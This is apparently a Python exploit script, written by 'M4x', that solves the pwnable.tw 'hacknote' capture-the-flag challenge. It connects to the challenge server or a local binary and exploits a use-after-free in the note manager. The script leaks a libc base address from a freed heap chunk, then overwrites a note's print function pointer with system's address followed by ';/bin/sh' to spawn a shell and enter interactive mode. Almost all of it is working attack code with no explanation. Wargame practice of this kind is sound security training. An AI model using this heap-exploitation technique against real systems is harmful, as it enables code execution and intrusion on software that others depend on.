#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep
import pdb
import sys

if sys.argv[1] == "l":
    conn = "./hacknote"
    main_arena = 0x1b3780
    symAddr = 0x3ab30
else:
    conn = ("chall.pwnable.tw", 10102)
    main_arena = 0x1B0780 
    symAddr = 0x3a940
io = zio(conn, print_write = COLORED(RAW, "yellow"), print_read = COLORED(RAW, "red"))

def addNote(size, content):
    io.read_until("choice :")
    io.write("1")
    io.read_until("size :") 
    io.write(str(size))
    io.read_until("Content :")
    io.write(content)

def delNote(idx):
    io.read_until("choice :")
    io.write("2")
    io.read_until("Index :")
    io.write(str(idx))
    

def printNote(idx):
    io.read_until("choice :")
    io.write("3")
    io.read_until("Index :")
    io.write(str(idx))

def leak():
    addNote(0x80, '0000') # 0
    addNote(0x80, '1111') # 1
    delNote(0)

    addNote(0x80, '0000') # 2
    printNote(2)
    
    libc_base = b32(io.read_until("\xf7")[-4: ][::-1]) - 48 - main_arena
    print "\n[*]libc_base -> {:#x}\n".format(libc_base)
    raw_input()
    return libc_base

def shell(libc_base):

    #  pdb.set_trace()
    #  DEBUG()
    # use || to execute system("sh")
    delNote(0)
    delNote(1)
    payload = l32(libc_base + symAddr) + ";/bin/sh\0"
    addNote(0x90, payload)

    printNote(0)

if __name__ == "__main__":
    #  DEBUG()
    shell(leak())
    io.interact()
    io.close()
